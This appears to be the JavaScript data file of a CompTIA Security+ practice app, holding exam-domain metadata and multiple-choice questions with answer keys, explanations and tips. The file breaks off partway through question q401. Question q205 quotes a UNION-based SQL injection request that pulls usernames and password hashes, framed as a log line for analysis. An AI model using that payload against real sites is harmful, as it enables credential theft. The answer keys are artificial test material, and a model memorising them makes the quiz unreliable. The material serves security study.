/**
 * CompTIA Security+ (SY0-701) Question Bank & PBQ Scenarios
 * Covers all 5 official exam domains with exam-realistic scenarios and detailed explanations.
 */

window.SECPLUS_DOMAINS = {
  "1.0": {
    id: "1.0",
    name: "General Security Concepts",
    weight: "12%",
    color: "#38bdf8",
    icon: "shield",
    summary: "Security controls, CIA triad, Zero Trust, cryptography, PKI, and deception technologies."
  },
  "2.0": {
    id: "2.0",
    name: "Threats, Vulnerabilities & Mitigations",
    weight: "22%",
    color: "#f43f5e",
    icon: "bug",
    summary: "Threat actors, attack vectors, social engineering, malware, application & network attacks, and mitigation strategies."
  },
  "3.0": {
    id: "3.0",
    name: "Security Architecture",
    weight: "18%",
    color: "#a855f7",
    icon: "cpu",
    summary: "Cloud models, Zero Trust architecture, network segmentation, secure infrastructure, and data protection."
  },
  "4.0": {
    id: "4.0",
    name: "Security Operations",
    weight: "28%",
    color: "#10b981",
    icon: "activity",
    summary: "Hardening, vulnerability management, SIEM/SOAR monitoring, IAM, incident response, and digital forensics."
  },
  "5.0": {
    id: "5.0",
    name: "Security Program Management & Oversight",
    weight: "20%",
    color: "#f59e0b",
    icon: "clipboard",
    summary: "Governance, risk management (ALE/SLE/ARO), third-party risk, compliance, audits, and security awareness."
  }
};

window.SECPLUS_QUESTIONS = [
  // ============================================================================
  // DOMAIN 1.0: GENERAL SECURITY CONCEPTS (12%)
  // ============================================================================
  {
    id: "q101",
    domain: "1.0",
    subdomain: "1.1 Security Controls",
    difficulty: "Medium",
    threatName: "Unauthorized Data Center Entry",
    targetNode: "Core DB",
    question: "A company installs high-visibility warning signs around its perimeter fence stating '24/7 Armed Security Patrol and Video Surveillance in Use.' Which category and type of security control does this sign PRIMARILY represent?",
    options: [
      "Physical and Deterrent",
      "Managerial and Preventive",
      "Technical and Detective",
      "Operational and Compensating"
    ],
    correct: 0,
    explanation: "Warning signs are physical objects placed at a facility perimeter (Physical category) intended to discourage a threat actor from attempting an intrusion (Deterrent functional type). They do not physically stop someone (Preventive) or record the intrusion themselves (Detective).",
    examTip: "Always distinguish control CATEGORY (Technical, Managerial, Operational, Physical) from FUNCTIONAL TYPE (Preventive, Deterrent, Detective, Corrective, Compensating, Directive)."
  },
  {
    id: "q102",
    domain: "1.0",
    subdomain: "1.1 Security Controls",
    difficulty: "Medium",
    threatName: "Legacy ERP Unpatched Exploit",
    targetNode: "Internal App",
    question: "A legacy manufacturing server runs a proprietary operating system that cannot be patched against a newly discovered remote code execution vulnerability without breaking critical production software. The security team places an application-aware firewall in front of the server to block exploit payloads while a replacement system is procured. What type of control is the firewall rule in this context?",
    options: [
      "Compensating control",
      "Directive control",
      "Corrective control",
      "Detective control"
    ],
    correct: 0,
    explanation: "A compensating control is an alternative measure implemented when the primary control (patching the OS) is not feasible due to business or technical constraints. It mitigates risk until a permanent fix can be applied.",
    examTip: "Look for keywords like 'legacy system cannot be patched' or 'temporary alternative measure' to identify a Compensating control."
  },
  {
    id: "q103",
    domain: "1.0",
    subdomain: "1.2 Fundamental Security Concepts",
    difficulty: "Hard",
    threatName: "Repudiation of Wire Transfer",
    targetNode: "Auth / IdP",
    question: "A financial institution requires that high-value wire transfers be cryptographically signed by the initiating broker so the broker cannot later deny having authorized the transaction. How is this requirement achieved?",
    options: [
      "The broker signs a hash of the transaction using their private key, providing non-repudiation",
      "The broker encrypts the transaction using the bank's public key, providing confidentiality",
      "The bank hashes the transaction with SHA-256 and appends a shared secret salt",
      "The broker signs the transaction using the bank's private key and verifies with TLS"
    ],
    correct: 0,
    explanation: "Non-repudiation ensures a sender cannot deny sending a message. In asymmetric cryptography, the sender hashes the data and encrypts (signs) the hash with their own PRIVATE key. Anyone with the sender's PUBLIC key can verify both integrity and authenticity.",
    examTip: "Digital Signatures = Sign with Sender's PRIVATE key, Verify with Sender's PUBLIC key. Encryption = Encrypt with Recipient's PUBLIC key, Decrypt with Recipient's PRIVATE key."
  },
  {
    id: "q104",
    domain: "1.0",
    subdomain: "1.2 Zero Trust",
    difficulty: "Hard",
    threatName: "Lateral Movement via VPN",
    targetNode: "Zero Trust PEP",
    question: "In a Zero Trust Architecture (ZTA), when a remote developer requests access to a sensitive code repository, which component evaluates device posture, user identity, and threat intelligence before issuing a decision to allow or deny the session?",
    options: [
      "Policy Engine (PE) / Policy Decision Point (PDP)",
      "Policy Enforcement Point (PEP)",
      "Security Information and Event Management (SIEM)",
      "Cloud Access Security Broker (CASB)"
    ],
    correct: 0,
    explanation: "In Zero Trust (NIST SP 800-207), the Control Plane consists of the Policy Engine (PE) and Policy Administrator (PA), collectively forming the Policy Decision Point (PDP). The PE evaluates context (identity, device health, behavioral analytics) to make the access decision, while the Policy Enforcement Point (PEP) in the Data Plane actually establishes or terminates the connection.",
    examTip: "Remember: PDP (Policy Engine + Policy Administrator) = Control Plane (Brain). PEP (Policy Enforcement Point) = Data Plane (Gatekeeper)."
  },
  {
    id: "q105",
    domain: "1.0",
    subdomain: "1.3 Change Management",
    difficulty: "Medium",
    threatName: "Botched Firewall Upgrade",
    targetNode: "Perimeter FW",
    question: "A network engineer is submitting a request to the Change Advisory Board (CAB) to upgrade the firmware on core routers during the Sunday maintenance window. Which element of the change management request is MOST critical for minimizing downtime if the new firmware causes BGP peering failures?",
    options: [
      "Documented backout / rollback plan",
      "Stakeholder impact assessment",
      "Sandbox load-testing metrics",
      "Updated network topology diagram"
    ],
    correct: 0,
    explanation: "A backout (rollback) plan defines the exact steps to revert a system to its previous known-good state if a change fails or causes unexpected outages during the maintenance window.",
    examTip: "On the exam, if a question asks what is needed 'in case a change fails during implementation', the answer is always a Backout/Rollback Plan."
  },
  {
    id: "q106",
    domain: "1.0",
    subdomain: "1.4 Cryptographic Solutions",
    difficulty: "Medium",
    threatName: "Certificate Revocation Latency",
    targetNode: "Web Gateway",
    question: "An organization wants to reduce TLS handshake latency for clients verifying its web server's X.509 certificate revocation status, while also preventing third-party Certificate Authorities (CAs) from seeing which client IP addresses are visiting the site. Which mechanism should the administrator enable on the web server?",
    options: [
      "OCSP Stapling",
      "Certificate Revocation Lists (CRLs)",
      "Certificate Signing Request (CSR) pinning",
      "Mutual TLS (mTLS) with wildcard certificates"
    ],
    correct: 0,
    explanation: "With OCSP Stapling, the web server periodically queries the OCSP responder itself, receives a digitally signed time-stamped OCSP response, and 'staples' it directly into the TLS handshake. This eliminates the need for the client browser to make a separate external connection to the CA.",
    examTip: "CRL = large downloadable list. OCSP = real-time single check (privacy/latency cost). OCSP Stapling = server caches signed OCSP response and sends it during TLS handshake."
  },
  {
    id: "q107",
    domain: "1.0",
    subdomain: "1.4 Cryptographic Solutions",
    difficulty: "Hard",
    threatName: "Quantum Decryption Harvest",
    targetNode: "Core DB",
    question: "A defense contractor is concerned about 'harvest now, decrypt later' attacks where adversaries record encrypted TLS traffic today to decrypt it once cryptographically relevant quantum computers (CRQCs) become available. Which cryptographic transition directly addresses this risk for key establishment?",
    options: [
      "Adopting lattice-based Post-Quantum Cryptography (PQC) algorithms such as ML-KEM (Kyber)",
      "Increasing AES symmetric key lengths from AES-128 to AES-256",
      "Migrating from RSA-2048 to Elliptic Curve Diffie-Hellman (ECDHE)",
      "Implementing Perfect Forward Secrecy (PFS) with ephemeral Diffie-Hellman keys"
    ],
    correct: 0,
    explanation: "Shor's algorithm on a quantum computer can break traditional asymmetric algorithms relying on integer factorization (RSA) and discrete logarithms (Diffie-Hellman, ECDHE, ECC). NIST-standardized Post-Quantum Cryptography (PQC) relies on lattice-based math (like ML-KEM/Kyber) that resists quantum attacks.",
    examTip: "Quantum computers break asymmetric crypto (RSA, ECC, DH) via Shor's algorithm, requiring Post-Quantum Cryptography (PQC). Symmetric crypto (AES-256) and hashing (SHA-384/512) only require larger keys against Grover's algorithm."
  },
  {
    id: "q108",
    domain: "1.0",
    subdomain: "1.2 Deception & Disruption",
    difficulty: "Easy",
    threatName: "Automated SMB Reconnaissance",
    targetNode: "Internal App",
    question: "A security architect places a fake file named `Passwords_2026_Prod.xlsx` inside an restricted network share. The file contains a hidden tracking beacon and triggers an immediate high-priority SIEM alert whenever any user or process opens it. What is this file called?",
    options: [
      "Honeyfile (Honeytoken)",
      "Honeynet",
      "Sinkhole",
      "Jump server"
    ],
    correct: 0,
    explanation: "A honeyfile is a bait file placed on a system to detect unauthorized access or lateral movement. Because legitimate users have no reason to open the decoy file, any access indicates malicious activity or insider snooping with near-zero false positives.",
    examTip: "Honeypot = single decoy system. Honeynet = network of decoy systems. Honeyfile = decoy file. Honeytoken = decoy credential, API key, or database record."
  },
  {
    id: "q109",
    domain: "1.0",
    subdomain: "1.4 Cryptographic Solutions",
    difficulty: "Medium",
    threatName: "VM Disk Theft",
    targetNode: "Endpoint Fleet",
    question: "A company wants to ensure that if a corporate laptop's SSD is physically removed and connected to another computer, the drive's contents cannot be read. Which hardware component on the laptop motherboard securely stores the BitLocker volume master key and verifies boot integrity?",
    options: [
      "Trusted Platform Module (TPM)",
      "Hardware Security Module (HSM)",
      "Unified Extensible Firmware Interface (UEFI)",
      "Secure Enclave coprocessor"
    ],
    correct: 0,
    explanation: "A TPM (Trusted Platform Module) is a dedicated cryptographic microchip soldered onto an endpoint's motherboard. It stores full-disk encryption (FDE) keys (like BitLocker) and verifies that the boot loader hasn't been tampered with before releasing the decryption key.",
    examTip: "TPM = single endpoint motherboard chip (used for FDE/Measured Boot). HSM = dedicated high-performance network/PCIe appliance for enterprise key management and CA root keys."
  },
  {
    id: "q110",
    domain: "1.0",
    subdomain: "1.4 Cryptographic Solutions",
    difficulty: "Medium",
    threatName: "Rainbow Table Credential Crack",
    targetNode: "Auth / IdP",
    question: "During a code audit, an engineer discovers that user passwords are stored in the database as `SHA256(password)`. Even if two users choose the same password, their hashes are identical, making the database vulnerable to precomputed rainbow table attacks. What should be added to the hashing process?",
    options: [
      "A unique, cryptographically random salt per user combined with key stretching (e.g., Argon2id or bcrypt)",
      "A static enterprise-wide pepper stored directly in the `users` table column",
      "Reversible AES-256-GCM encryption so passwords can be rotated automatically",
      "An HMAC-MD5 digest computed using the user's username as the key"
    ],
    correct: 0,
    explanation: "Salting appends a unique random string to each password before hashing, ensuring two identical passwords produce completely different hashes and defeating precomputed rainbow tables. Key stretching algorithms (bcrypt, PBKDF2, Argon2) intentionally slow down brute-force cracking.",
    examTip: "Salts defeat rainbow tables (unique per user, stored with hash). Key stretching (bcrypt/PBKDF2/Argon2) slows down GPU brute-forcing."
  },

  // ============================================================================
  // DOMAIN 2.0: THREATS, VULNERABILITIES, AND MITIGATIONS (22%)
  // ============================================================================
  {
    id: "q201",
    domain: "2.0",
    subdomain: "2.1 Threat Actors & Motivations",
    difficulty: "Easy",
    threatName: "Stealth Firmware Implant",
    targetNode: "Core DB",
    question: "A power grid operator discovers custom, zero-day malware lurking in its SCADA controllers for over 18 months. The malware did not deploy ransomware or steal credit cards; instead, it quietly mapped industrial control topology for potential future disruption. Which threat actor is MOST likely responsible?",
    options: [
      "Nation-state / Advanced Persistent Threat (APT)",
      "Financially motivated cybercrime syndicate",
      "Hacktivist collective",
      "Unskilled script kiddie"
    ],
    correct: 0,
    explanation: "Nation-state actors (APTs) possess high sophistication and funding, utilize custom zero-day exploits, maintain long-term stealthy persistence ('low and slow'), and target critical infrastructure or geopolitical espionage rather than quick financial gain.",
    examTip: "Critical infrastructure + zero-day + long dwell time + espionage/sabotage = Nation-State / APT."
  },
  {
    id: "q202",
    domain: "2.0",
    subdomain: "2.2 Attack Vectors & Social Engineering",
    difficulty: "Medium",
    threatName: "MFA Fatigue Push Bombing",
    targetNode: "Auth / IdP",
    question: "An attacker compromises an employee's Active Directory password via credential stuffing. At 2:00 AM, the attacker repeatedly triggers 40 consecutive push notifications to the employee's authenticator app until the annoyed employee taps 'Approve' just to stop the phone from buzzing. What is this attack called, and what is the BEST mitigation?",
    options: [
      "MFA fatigue (push bombing); mitigate with number matching or FIDO2/WebAuthn hardware keys",
      "SIM swapping; mitigate by switching to SMS-based OTP codes",
      "Pass-the-Hash; mitigate by enforcing 90-day password expiration",
      "Session hijacking; mitigate by setting the `HttpOnly` flag on cookies"
    ],
    correct: 0,
    explanation: "MFA fatigue (or push bombing) overwhelms a user with repeated MFA push requests until they accidentally or frustratedly approve one. Implementing number matching (requiring the user to type a number shown on the login screen) or phishing-resistant FIDO2 tokens prevents blind approvals.",
    examTip: "SY0-701 emphasizes modern MFA attacks. Push bombing is defeated by MFA number matching, rate limiting, and FIDO2 keys."
  },
  {
    id: "q203",
    domain: "2.0",
    subdomain: "2.2 Social Engineering",
    difficulty: "Easy",
    threatName: "Watering Hole Compromise",
    targetNode: "Endpoint Fleet",
    question: "An attacker wants to compromise engineers at a highly secure aerospace defense firm. Knowing the engineers rarely click phishing links, the attacker compromises a niche local food-truck ordering website that the engineers visit every Friday at lunch, injecting a browser exploit kit. What type of attack is this?",
    options: [
      "Watering hole attack",
      "Whaling attack",
      "Typosquatting",
      "Vishing with pretexting"
    ],
    correct: 0,
    explanation: "A watering hole attack compromises a third-party website frequently visited by members of the target organization, waiting for victims to visit the trusted site and become infected.",
    examTip: "Third-party site frequented by a specific target group = Watering Hole. Fake lookalike domain name (e.g., g00gle.com) = Typosquatting."
  },
  {
    id: "q204",
    domain: "2.0",
    subdomain: "2.3 Vulnerabilities",
    difficulty: "Hard",
    threatName: "TOCTOU Privilege Escalation",
    targetNode: "Internal App",
    question: "A privileged backup service checks whether a temporary file belongs to a standard user (`access()`) and, 5 milliseconds later, opens that file path with root permissions (`open()`). An attacker writes a script that swaps the file with a symbolic link to `/etc/shadow` during that 5-millisecond window. What vulnerability is being exploited?",
    options: [
      "Race condition (Time-of-Check to Time-of-Use / TOCTOU)",
      "Buffer overflow via pointer dereference",
      "Insecure Direct Object Reference (IDOR)",
      "SQL injection via second-order payload"
    ],
    correct: 0,
    explanation: "A Time-of-Check to Time-of-Use (TOCTOU) vulnerability is a specific type of race condition where the state of a resource changes between the moment the program checks its security properties and the moment the program actually uses the resource.",
    examTip: "Whenever a scenario describes a narrow timing window between verifying permissions and executing an action, think Race Condition / TOCTOU."
  },
  {
    id: "q205",
    domain: "2.0",
    subdomain: "2.4 Malicious Activity",
    difficulty: "Medium",
    threatName: "SQL Injection Payload",
    targetNode: "Core DB",
    question: "A SOC analyst inspects web server logs and sees the following HTTP GET request to a product search page:\n`GET /items?category=electronics'+UNION+SELECT+username,password_hash+FROM+users--`\nWhich remediation will MOST effectively prevent this vulnerability at the code level?",
    options: [
      "Parameterized queries (prepared statements)",
      "Client-side JavaScript input validation",
      "Deploying TLS 1.3 across all web endpoints",
      "Enabling Cross-Origin Resource Sharing (CORS) headers"
    ],
    correct: 0,
    explanation: "The log shows a classic UNION-based SQL Injection (SQLi) attack. Parameterized queries (prepared statements) strictly separate the SQL query structure from user-supplied data, ensuring the database treats input strictly as a literal value and never as executable SQL commands.",
    examTip: "Parameterized queries / Prepared statements = #1 answer for preventing SQL Injection (SQLi). WAF is a secondary/compensating defense, and client-side validation is easily bypassed."
  },
  {
    id: "q206",
    domain: "2.0",
    subdomain: "2.4 Malicious Activity",
    difficulty: "Medium",
    threatName: "Living-off-the-Land (LotL)",
    targetNode: "Endpoint Fleet",
    question: "During an incident investigation, analysts find no traditional malware binaries on the compromised Windows server. Instead, the attacker used built-in administrative tools (`PowerShell.exe`, `certutil.exe`, and `wmic.exe`) to enumerate the domain and download scripts. What technique is the attacker using?",
    options: [
      "Fileless / Living-off-the-Land (LotL) attack",
      "Rootkit kernel hooking",
      "Logic bomb execution",
      "Bloatware side-loading"
    ],
    correct: 0,
    explanation: "Living-off-the-Land (LotL) and fileless attacks leverage legitimate, pre-installed OS administrative binaries (LOLBins like PowerShell, WMI, certutil) to execute malicious actions in memory without dropping signature-detectable malware files to disk.",
    examTip: "PowerShell / WMI / certutil / bash used maliciously without custom binaries on disk = Fileless malware or Living-off-the-Land (LotL)."
  },
  {
    id: "q207",
    domain: "2.0",
    subdomain: "2.4 Network Attacks",
    difficulty: "Medium",
    threatName: "VLAN Hopping Double Tagging",
    targetNode: "Perimeter FW",
    question: "An attacker connected to an access switch port configured on VLAN 10 crafts an Ethernet frame with two 802.1Q tags: an outer tag for VLAN 10 (which is also the trunk's native VLAN) and an inner tag for VLAN 99 (the isolated server VLAN). When the first switch strips the outer native VLAN tag and forwards the frame across the trunk, the frame lands on VLAN 99. How do you mitigate this attack?",
    options: [
      "Change the native VLAN to an unused VLAN ID and explicitly tag all native VLAN traffic on trunks",
      "Enable PortFast and BPDU Guard on all trunk ports",
      "Configure Dynamic ARP Inspection (DAI) with a /32 subnet mask",
      "Disable Spanning Tree Protocol (STP) on the core switch"
    ],
    correct: 0,
    explanation: "Double-tagging VLAN hopping exploits switches when the attacker's access port belongs to the same VLAN as the trunk's untagged Native VLAN. Moving the native VLAN to a dedicated, unused dummy VLAN and pruning/tagging native traffic stops double-tagging.",
    examTip: "VLAN Hopping occurs via (1) Switch spoofing (mitigate: disable DTP/auto-trunking) or (2) Double tagging (mitigate: change Native VLAN to an unused ID)."
  },
  {
    id: "q208",
    domain: "2.0",
    subdomain: "2.4 Cryptographic Attacks",
    difficulty: "Medium",
    threatName: "SSL Stripping Downgrade",
    targetNode: "Web Gateway",
    question: "A user at a coffee shop types `mybank.com` into their browser. An on-path (Man-in-the-Middle) attacker intercepts the initial HTTP request before it redirects to HTTPS, serving the user an unencrypted HTTP version of the site while maintaining an HTTPS connection to the real bank. Which HTTP response header instructs browsers to NEVER connect over unencrypted HTTP in the future?",
    options: [
      "Strict-Transport-Security (HSTS)",
      "Content-Security-Policy (CSP)",
      "X-Frame-Options: DENY",
      "X-Content-Type-Options: nosniff"
    ],
    correct: 0,
    explanation: "HTTP Strict Transport Security (HSTS) forces the browser to only communicate with the domain over HTTPS for a specified duration (`max-age`), automatically upgrading any `http://` links internally and blocking SSL stripping/downgrade attacks.",
    examTip: "HSTS = prevents SSL stripping/downgrade. CSP = mitigates Cross-Site Scripting (XSS). X-Frame-Options = prevents Clickjacking."
  },
  {
    id: "q209",
    domain: "2.0",
    subdomain: "2.5 Mitigation Techniques",
    difficulty: "Easy",
    threatName: "Rogue DHCP Server",
    targetNode: "Perimeter FW",
    question: "An employee plugs a consumer wireless router into a conference room wall jack. Soon after, laptops on the floor receive incorrect default gateway and DNS addresses, causing an outage and potential Man-in-the-Middle interception. Which switch feature prevents unauthorized ports from responding with `DHCPOFFER` and `DHCPACK` messages?",
    options: [
      "DHCP Snooping",
      "802.1X NAC",
      "Port mirroring (SPAN)",
      "Split-horizon DNS"
    ],
    correct: 0,
    explanation: "DHCP Snooping categorizes switch ports into 'trusted' (uplinks to legitimate DHCP servers) and 'untrusted' (access ports). It drops any DHCP server responses (`DHCPOFFER`, `DHCPACK`) coming from untrusted access ports and builds a DHCP binding table used by Dynamic ARP Inspection (DAI).",
    examTip: "DHCP Snooping stops rogue DHCP servers. Dynamic ARP Inspection (DAI) uses the DHCP Snooping binding table to stop ARP poisoning/spoofing."
  },
  {
    id: "q210",
    domain: "2.0",
    subdomain: "2.3 Supply Chain Vulnerabilities",
    difficulty: "Medium",
    threatName: "Malicious Open-Source Dependency",
    targetNode: "Internal App",
    question: "Following a high-profile vulnerability discovered in a transitive open-source logging library (`log4j`), a federal customer asks your software engineering team for a standardized, machine-readable inventory of every open-source library, version, and dependency bundled inside your application container. What are they requesting?",
    options: [
      "Software Bill of Materials (SBOM)",
      "Common Vulnerability Scoring System (CVSS) vector",
      "Service Level Agreement (SLA)",
      "Attestation of Conformance (AoC)"
    ],
    correct: 0,
    explanation: "A Software Bill of Materials (SBOM) is a formal, nested inventory of all software components, libraries, modules, and dependencies that make up an application, allowing rapid identification of supply-chain vulnerabilities.",
    examTip: "SBOM (Software Bill of Materials) is a new focus area in SY0-701 under supply chain risk and vulnerability management."
  },

  // ============================================================================
  // DOMAIN 3.0: SECURITY ARCHITECTURE (18%)
  // ============================================================================
  {
    id: "q301",
    domain: "3.0",
    subdomain: "3.1 Cloud & Shared Responsibility",
    difficulty: "Medium",
    threatName: "Misconfigured Cloud Storage",
    targetNode: "Core DB",
    question: "A healthcare company migrates its customer portal to a public cloud provider using an Infrastructure as a Service (IaaS) model. According to the Cloud Shared Responsibility Matrix, which of the following security tasks remains the SOLE responsibility of the healthcare company (the customer)?",
    options: [
      "Patching the guest operating system and configuring data encryption permissions",
      "Patching the underlying ESXi/KVM hypervisor host firmware",
      "Securing physical biometric access to the data center cages",
      "Replacing failed enterprise SAN drives in the storage array"
    ],
    correct: 0,
    explanation: "In an IaaS model, the cloud provider secures the physical facility, hardware, storage, and hypervisor ('security OF the cloud'), while the customer is responsible for the guest OS, middleware, applications, IAM access policies, and data ('security IN the cloud').",
    examTip: "IaaS = Customer manages Guest OS & up. PaaS = Customer manages Application code, IAM & Data. SaaS = Customer manages IAM & Data."
  },
  {
    id: "q302",
    domain: "3.0",
    subdomain: "3.1 Serverless & Microservices",
    difficulty: "Medium",
    threatName: "East-West Microservice Spoofing",
    targetNode: "Internal App",
    question: "An organization decomposes a monolithic application into 60 containerized microservices running in Kubernetes. The security architect needs to enforce mutual TLS (mTLS), service-to-service authorization, and traffic telemetry between containers without modifying the source code of each microservice. What should be deployed?",
    options: [
      "A Service Mesh using sidecar proxies",
      "A traditional north-south perimeter firewall",
      "An Air-Gapped VLAN per container",
      "A Content Delivery Network (CDN)"
    ],
    correct: 0,
    explanation: "A Service Mesh (such as Istio or Linkerd) deploys lightweight sidecar proxies alongside each microservice container to transparently handle east-west mTLS encryption, authentication, and observability without changing application code.",
    examTip: "North-South traffic = client-to-datacenter (handled by API Gateway / WAF / Ingress Firewall). East-West container-to-container traffic = handled by a Service Mesh / Microsegmentation."
  },
  {
    id: "q303",
    domain: "3.0",
    subdomain: "3.2 Infrastructure Concepts",
    difficulty: "Medium",
    threatName: "Shadow SaaS Exfiltration",
    targetNode: "Web Gateway",
    question: "An enterprise discovers that employees are uploading sensitive source code to unsanctioned personal cloud storage accounts and generative AI websites. Which security solution sits between users and cloud providers to discover 'Shadow IT', enforce DLP policies, and block unsanctioned SaaS applications?",
    options: [
      "Cloud Access Security Broker (CASB)",
      "Web Application Firewall (WAF)",
      "Network Access Control (NAC)",
      "Virtual Private Network (VPN) concentrator"
    ],
    correct: 0,
    explanation: "A Cloud Access Security Broker (CASB) acts as a policy enforcement center between cloud service consumers and cloud providers. It provides visibility into Shadow IT, enforces Data Loss Prevention (DLP), and governs SaaS/PaaS/IaaS usage via API or proxy modes.",
    examTip: "CASB = visibility into Shadow IT + enforcing security/DLP policies across SaaS applications. WAF = protects your OWN web applications from inbound OWASP attacks."
  },
  {
    id: "q304",
    domain: "3.0",
    subdomain: "3.2 SASE & Secure Connectivity",
    difficulty: "Medium",
    threatName: "Remote Branch Split-Tunnel Leak",
    targetNode: "Zero Trust PEP",
    question: "A global company is replacing its slow MPLS links and backhauled legacy VPNs with a unified cloud-delivered architecture that combines SD-WAN networking with Zero Trust Network Access (ZTNA), Secure Web Gateway (SWG), CASB, and Firewall-as-a-Service (FWaaS) at the edge. What is this architectural framework called?",
    options: [
      "Secure Access Service Edge (SASE)",
      "Software-Defined Data Center (SDDC)",
      "Demilitarized Zone (DMZ) screened subnet",
      "Infrastructure as Code (IaC)"
    ],
    correct: 0,
    explanation: "SASE (Secure Access Service Edge) converges wide-area networking (SD-WAN) and cloud-native network security services (SWG, CASB, FWaaS, ZTNA) into a single cloud-delivered service model close to the user.",
    examTip: "SASE = SD-WAN + Security Service Edge (ZTNA + SWG + CASB + FWaaS) delivered from the cloud edge."
  },
  {
    id: "q305",
    domain: "3.0",
    subdomain: "3.2 ICS / SCADA Architecture",
    difficulty: "Hard",
    threatName: "IT-to-OT Ransomware Pivot",
    targetNode: "Perimeter FW",
    question: "A water treatment plant wants to transfer real-time sensor telemetry from its Operational Technology (OT) SCADA network to the corporate IT analytics cloud while guaranteeing with physical hardware physics that ZERO network packets can ever travel back from the IT network into the OT network. What device should be installed at the boundary?",
    options: [
      "Unidirectional Security Gateway (Data Diode)",
      "Stateful Layer 4 Firewall",
      "Bastion Host / Jump Box",
      "Reverse Proxy Load Balancer"
    ],
    correct: 0,
    explanation: "A Data Diode (Unidirectional Security Gateway) uses an optical transmitter (LED) on the source side and a photoreceiver on the destination side with no return fiber, physically enforcing one-way data flow (typically from high-criticality OT to IT or vice versa).",
    examTip: "Physical one-way-only network link = Data Diode (Unidirectional Gateway)."
  },
  {
    id: "q306",
    domain: "3.0",
    subdomain: "3.3 Protecting Data",
    difficulty: "Medium",
    threatName: "PCI-DSS Cardholder Exposure",
    targetNode: "Core DB",
    question: "An e-commerce merchant wants to process recurring subscription payments without storing actual 16-digit Primary Account Numbers (PANs) in its database, thereby reducing its PCI-DSS audit scope. Instead, the database stores a randomly generated lookup identifier `(e.g., TKN-8841-9920)` mapped in a secure payment vault. Which technique is being used, and why is it preferred over hashing here?",
    options: [
      "Tokenization; because it replaces sensitive data with a non-mathematical reference token that can be looked up by the payment processor without exposing the original PAN",
      "Data masking; because asterisks `****1234` can be mathematically decrypted during checkout",
      "Salted SHA-256 hashing; because hashes can be reversed by the bank during settlement",
      "Steganography; because the credit card number is hidden inside product JPEG images"
    ],
    correct: 0,
    explanation: "Tokenization substitutes sensitive data (like a credit card PAN or SSN) with a random, non-sensitive surrogate value (token) stored in a secure token vault. Unlike encryption, there is no mathematical relationship between the token and the original plaintext; unlike one-way hashing, the authorized vault can retrieve the original PAN for recurring billing.",
    examTip: "Tokenization = random reference lookup table (great for PCI-DSS credit cards). Masking = hiding characters for display (`XXX-XX-1234`). Hashing = one-way cryptographic digest."
  },
  {
    id: "q307",
    domain: "3.0",
    subdomain: "3.4 Resilience & Recovery",
    difficulty: "Medium",
    threatName: "Regional Datacenter Power Outage",
    targetNode: "Core DB",
    question: "A hospital's Electronic Health Record (EHR) system requires near-zero downtime (RTO < 5 minutes, RPO = 0). The organization maintains a secondary facility with fully configured servers, live synchronous database replication, and load balancers ready to take traffic immediately if the primary site fails. Which disaster recovery site model is this?",
    options: [
      "Hot site",
      "Warm site",
      "Cold site",
      "Mobile recovery site"
    ],
    correct: 0,
    explanation: "A Hot Site is a fully redundant, active or near-instant failover environment with live hardware, patched software, and real-time or near-real-time replicated data, capable of taking over operations within minutes.",
    examTip: "Hot site = hardware + software + live data (minutes failover). Warm site = hardware + connectivity, needs recent backup restore (hours/days). Cold site = empty rack space/power/cooling only (weeks)."
  },
  {
    id: "q308",
    domain: "3.0",
    subdomain: "3.4 Resilience & Backups",
    difficulty: "Medium",
    threatName: "Ransomware Backup Wiping",
    targetNode: "Core DB",
    question: "A company sets up its backup schedule as follows: Every Sunday night, a Full backup is performed. Monday through Saturday nights, the backup job copies ALL files that have changed since Sunday's Full backup. If the server crashes on Thursday afternoon, how many backup sets are required to restore the server, and what backup type is running Monday–Saturday?",
    options: [
      "2 backup sets (Sunday's Full + Wednesday's Differential); Differential backup",
      "5 backup sets (Sunday's Full + Mon, Tue, Wed, Thu Incrementals); Incremental backup",
      "1 backup set (Wednesday's Snapshot); Copy backup",
      "2 backup sets (Sunday's Full + Wednesday's Incremental); Incremental backup"
    ],
    correct: 0,
    explanation: "A Differential backup copies all data modified since the last FULL backup. Therefore, restoring requires only 2 sets: the last Full backup (Sunday) plus the latest Differential backup (Wednesday). By contrast, an Incremental backup only copies changes since the last backup of ANY type (clearing the archive bit), which builds faster backups but requires restoring the Full + EVERY daily incremental.",
    examTip: "Incremental = fast backup, slow restore (needs Full + ALL Incrementals). Differential = moderate backup, fast restore (needs Full + LAST Differential only)."
  },
  {
    id: "q309",
    domain: "3.0",
    subdomain: "3.2 Network Appliances",
    difficulty: "Easy",
    threatName: "Inbound Botnet DDoS & Scraping",
    targetNode: "Web Gateway",
    question: "An organization places an appliance in front of its internal web servers that accepts incoming client connections from the internet, terminates the TLS session, inspects the HTTP request, and opens a new internal connection to one of five backend servers while hiding the backend servers' private IP addresses. What is this appliance acting as?",
    options: [
      "Reverse proxy / Load balancer",
      "Forward proxy",
      "Spanning tree bridge",
      "Out-of-band passive tap"
    ],
    correct: 0,
    explanation: "A Reverse Proxy sits in front of backend servers, accepting requests from external clients on behalf of the servers, performing TLS offloading, caching, and load balancing. A Forward Proxy sits in front of internal clients to filter outbound requests to the internet.",
    examTip: "Forward Proxy = protects internal CLIENTS going out to the internet. Reverse Proxy = protects internal SERVERS from external clients coming in."
  },
  {
    id: "q310",
    domain: "3.0",
    subdomain: "3.4 High Availability & RAID",
    difficulty: "Easy",
    threatName: "Dual Disk Array Failure",
    targetNode: "Core DB",
    question: "A storage administrator is configuring a 6-drive array for a mission-critical database. The array must provide both read/write performance striping and fault tolerance via distributed dual parity so it can survive the simultaneous failure of any TWO drives without data loss. Which RAID level meets this requirement?",
    options: [
      "RAID 6",
      "RAID 5",
      "RAID 1",
      "RAID 0"
    ],
    correct: 0,
    explanation: "RAID 6 uses block-level striping with double distributed parity, requiring at least 4 drives and surviving up to 2 simultaneous drive failures. RAID 5 only survives 1 drive failure, and RAID 0 has zero fault tolerance.",
    examTip: "RAID 0 = Striping only (0 fault tolerance). RAID 1 = Mirroring. RAID 5 = Striping + single parity (1 drive loss). RAID 6 = Striping + dual parity (2 drive loss). RAID 10 = Stripe of mirrors."
  },

  // ============================================================================
  // DOMAIN 4.0: SECURITY OPERATIONS (28%)
  // ============================================================================
  {
    id: "q401",
    domain: "4.0",
    subdomain: "4.1 Wireless Security",
    difficulty: "Medium",
    threatName: "Evil Twin Wi-Fi Offline Crack",
    targetNode: "Auth / IdP",
